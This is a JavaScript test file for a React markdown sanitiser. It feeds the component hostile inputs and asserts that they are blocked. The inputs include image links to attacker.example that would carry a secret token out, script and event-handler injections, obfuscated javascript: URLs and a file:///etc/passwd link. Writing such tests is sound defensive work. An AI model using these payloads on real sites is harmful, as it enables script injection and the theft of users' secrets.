import test from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";

import { SafeMarkdown } from "../src/components/safe-markdown.tsx";

const render = (text) => renderToStaticMarkup(createElement(SafeMarkdown, null, text));

test("Markdown images cannot load remote, local, reference or data resources", () => {
  const html = render(
    [
      "![remote](https://attacker.example/collect?secret=token)",
      "![local](/api/v1/runs/secret/cancel)",
      "![relative](collect?secret=token)",
      "![data](data:image/svg+xml;base64,PHN2Zz4=)",
      "![reference][tracking]",
      "[tracking]: //attacker.example/pixel",
      "![](https://attacker.example/empty)",
    ].join("\n\n"),
  );

  assert.doesNotMatch(
    html,
    /<(?:img|link|iframe)|\b(?:src|srcset)=|attacker\.example|secret=token/,
  );
  assert.match(html, /remote/);
  assert.match(html, /reference/);
  assert.match(html, /Image omitted/);
});

test("raw HTML and executable elements are not rendered", () => {
  const html = render(
    [
      "<script>alert(1)</script>",
      '<img src="https://attacker.example" onerror="alert(1)">',
      '<iframe src="https://attacker.example"></iframe>',
      '<svg onload="alert(1)"></svg>',
      '<form action="/api/v1/runs"><input autofocus></form>',
      '<a href="javascript:alert(1)">unsafe</a>',
    ].join("\n\n"),
  );

  assert.doesNotMatch(html, /<(?:script|img|iframe|svg|form|input|a)\b|onerror=|onload=/);
});

test("unsafe links keep their labels without navigation", () => {
  const urls = [
    "javascript:alert%281%29",
    "JaVaScRiPt:alert%281%29",
    "jav&#x61;script:alert%281%29",
    "data:text/html,attack",
    "vbscript:attack",
    "file:///etc/passwd",
    "blob:https://example.com/id",
    "//attacker.example/path",
    "/api/v1/runs",
    "../settings",
    "?action=delete",
    "https://user:password@example.com",
    "https://",
    "https://example.com\\@attacker.example",
  ];

  for (const url of urls) {
    const html = render(`[label](${url})`);

    assert.match(html, /label/);
    assert.doesNotMatch(html, /<a\b|href=/, url);
  }
});

test("HTTP(S) links require a click and isolate opener and referrer", () => {
  const html = render(
    "[source](https://example.com/report?q=1) [http](http://example.com) [section](#summary)",
  );

  assert.match(
    html,
    /href="https:\/\/example.com\/report\?q=1" target="_blank" rel="noopener noreferrer" referrerPolicy="no-referrer"/,
  );
  assert.match(html, /href="http:\/\/example.com\/" target="_blank"/);
  assert.match(html, /href="#summary" rel=/);
});

test("normal Markdown and GFM remain available with inert code", () => {
  const html = render(
    "# Summary\n\n**bold** and *italic* and ~~removed~~\n\n- [x] Done\n\n| A | B |\n| - | - |\n| 1 | 2 |\n\n```html\n<img src=x onerror=alert(1)>\n```",
  );

  for (const tag of ["h1", "strong", "em", "del", "ul", "table", "pre", "code"]) {
    assert.match(html, new RegExp(`<${tag}\\b`));
  }

  assert.match(html, /disabled=""/);
  assert.match(html, /&lt;img/);
  assert.doesNotMatch(html, /<img\b/);
});
